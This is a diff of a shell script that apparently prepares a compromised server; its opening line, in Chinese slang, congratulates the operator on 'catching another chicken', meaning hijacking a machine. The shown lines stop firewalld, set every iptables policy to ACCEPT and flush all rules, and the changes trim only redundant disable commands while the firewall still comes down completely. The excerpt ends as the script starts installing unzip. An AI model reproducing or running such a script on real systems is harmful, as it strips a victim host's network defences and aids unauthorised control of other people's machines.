@@ -4,20 +4,11 @@ echo "老板又抓到鸡啦？恭喜恭喜啊！！！"
 sudo apt update
 
 echo "关闭所有防火墙规则"
-sudo systemctl stop firewalld
-sudo systemctl disable firewalld
-sudo systemctl status firewalld
 systemctl stop firewalld.service
 sudo iptables -P INPUT ACCEPT
 sudo iptables -P FORWARD ACCEPT
 sudo iptables -P OUTPUT ACCEPT
 sudo iptables -F
-
-sudo iptables -F
-sudo systemctl stop iptables
-sudo systemctl disable iptables
-sudo service iptables save
-
 
 # 安装 unzip
 echo "安装 unzip..."
